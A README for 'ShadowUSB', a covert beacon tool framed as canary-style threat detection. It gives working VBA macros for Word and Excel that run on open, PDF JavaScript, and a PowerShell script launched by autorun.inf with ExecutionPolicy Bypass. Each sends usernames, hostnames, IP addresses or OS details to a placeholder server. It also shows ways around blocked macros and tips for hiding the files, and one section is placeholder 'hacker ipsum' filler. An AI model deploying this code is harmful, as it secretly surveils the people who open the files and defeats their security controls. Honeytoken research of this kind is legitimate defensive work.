# ShadowUSB
shadowUSB.jpeg
ShadowUSB is a covert tracking tool designed to monitor and log interactions with untrusted documents and USB drives. By embedding beaconized documents, ShadowUSB tracks when and where files are accessed, offering valuable insights into unauthorized usage. Whether plugged into an unknown machine or opening potentially risky documents, ShadowUSB silently captures the event, providing detailed analytics on user behavior. Ideal for cybersecurity professionals and organizations looking to enhance their threat detection capabilities, ShadowUSB adds an extra layer of security by shedding light on otherwise invisible activities.

## Beaconizing the Doc's
Haxx0r ipsum ascii worm *.* rsa Leslie Lamport it's a feature echo memory leak syn race condition recursively. Packet break root Linus Torvalds case kilo bypass false bytes continue endif sql foad stdio.h pragma chown. Crack else blob infinite loop packet pwned float shell afk.

### Beaconizing Word
Let's beaconize Word. You'll need to have the developer tab in your ribbon for Word. Click VB, make sure your are in ThisDocument, and copy in this code.  Also don't forget to change yourwebserver.com to your server address.
```commandline
Private Sub Document_Open()
    MsgBox "Word Document Opened" ' Debugging message
    Dim HttpReq As Object
    Set HttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    HttpReq.Open "GET", "http://yourwebserver.com/tracker?doc=word&user=" & Environ("USERNAME"), False
    HttpReq.Send
End Sub
```

Mo Macros, Mo Problems... Your company blocks macros/VB.  No problemo.  We will use a shapes and hyperlinks to bypass this.
```commandline
Steps to Create a Whole-Page Link in Word M365

1. Open your Word Document:

 - Start with the document where you want to add the whole-page link.
 
2. Insert a Shape:

 - Go to the Insert tab.
 - Click on Shapes and choose Rectangle.
 - Draw a rectangle that covers the entire page. You can drag the edges of the shape to ensure it covers the full width and height of the page.

3. Make the Shape Transparent:

 - With the rectangle selected, go to the Format tab.
 - Click on Shape Fill and select No Fill.
 - Click on Shape Outline and select No Outline. This will make the rectangle invisible.

4. Add a Hyperlink to the Shape:

 - Right-click on the shape and select Link (or Hyperlink).  e.g., http://yourserver.com/track?doc=word
 - In the dialog box, enter the URL or the location within the document you want to link to.
 - Click OK.

5. Send the Shape to the Back:

 - With the shape still selected, go to the Format tab.
 - Click on Send Backward > Send to Back to ensure it doesn't cover any text or other content on the page.

6. Test the Link:

 - Save your document and test the link by clicking anywhere on the page.
```

### Beaconizing Excel
Let's beaconize Excel. You'll need to have the developer tab in your ribbon for Excel.  Click VB, make sure you are in ThisWorkbook, and copy in this code.  Also don't forget to change yourwebserver.com/ to your web server address.

Visual Basic [VB]
```commandline
Private Sub Workbook_Open()
    Dim HttpReq As Object
    Set HttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    HttpReq.Open "GET", "http://yourwebserver.com/tracker?doc=excel&user=" & Environ("USERNAME"), False
    HttpReq.Send
End Sub
```
As you can guess... Most businesses/users would[SHOULD!] have macros disabled.  To bypass this we will use Excels "Get Data" feature and a hyperlink to our tracking web server.
```commandline
- In Excel, go to the "Data" tab and select "Get External Data."
- Choose "From Web" and enter your tracking URL, e.g., http://yourserver.com/track?doc=excel.
- This will trigger a request when the document is opened, but it might also prompt the user.
```
### Beaconizing PDFs

Here we will beaconize our PDFs.  I am using a combination of JavaScript and Tracking URLs.  I am doing this to try to keep things stealthy.  Usernames via web browsers are tricky but I can get IP Addresses and User Agent info that helps track the end user.

JavaScript Code:
```
var viewerApp = app.viewerType;
var viewerVersion = app.viewerVersion;
var user = app.response("Please enter your username:");


var url = "http://yourwebserver.com/tracker?doc=pdf&user=" + encodeURIComponent(user) + "&app=" + encodeURIComponent(viewerApp) + "&version=" + encodeURIComponent(viewerVersion);

app.launchURL(url, true);
```    
Tracking URL:
```commandline
http://yourserver.com/track?id=UniqueID12345
```
## Backend Tracker 
The tracker.py takes care of the back end tracking.  This is a WIP.  It is basic at the moment but tracks and logs to a track.log file.  It currently uses VB and JavaScript, I am working on making it more stealthy to the end user.

To launch the backend tracker:
```commandline
python tracker.py
or
python3 tracker.py
```
### Tracking/Logging Webpage
I added a webpage to the backend script.  It shows a more C-Level easy to read version of the logs.  You can this with your C-Level/non-tech management.  Also makes it easier to read for "1337 h4xx0rs"... I mean cybersecurity professionals.

To access this feature:
```commandline
http://yourserver.com:8000/logs
```

This gives access to Real-Time Updates:  The logs will update each time the page is refreshed, reflecting the most recent tracking events.

## USB Drive [Hardware] tracking
To track the actual USB drive we will use powershell and auto run.  You can do this with python as well. I may implement that later.  As for now powershell works great.

### Powershell Script for tracking[beaconizing] the physical USB drive.
This powershell script is pretty self explanitory.  It will give you the IP Address, Hostname, Username and OS Version of the user that inserted the drive.  Copy this script save it as tracker.ps1  For stealthiness store this tracker.ps1 and the autorun.inf file in a hidden folder on your ShadowUSB drive.
```commandline
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq (Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq 'Up' }).InterfaceAlias } | Select-Object -First 1).IPAddress
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os_version = (Get-WmiObject Win32_OperatingSystem).Version
$user_agent = "$hostname-$username-$os_version"

Invoke-WebRequest -Uri "http://yourwebserver.com/tracker?id=USBTracking&hostname=$hostname&ip=$ip&user=$username&os=$os_version" -UserAgent $user_agent
```

### Autorun via autorun.inf
You can use notepad copy this code and save it as autorun.inf
```commandline
[autorun]
open=powershell -ExecutionPolicy Bypass -File tracker.ps1
action=Run tracking script
label=USB Tracker
```
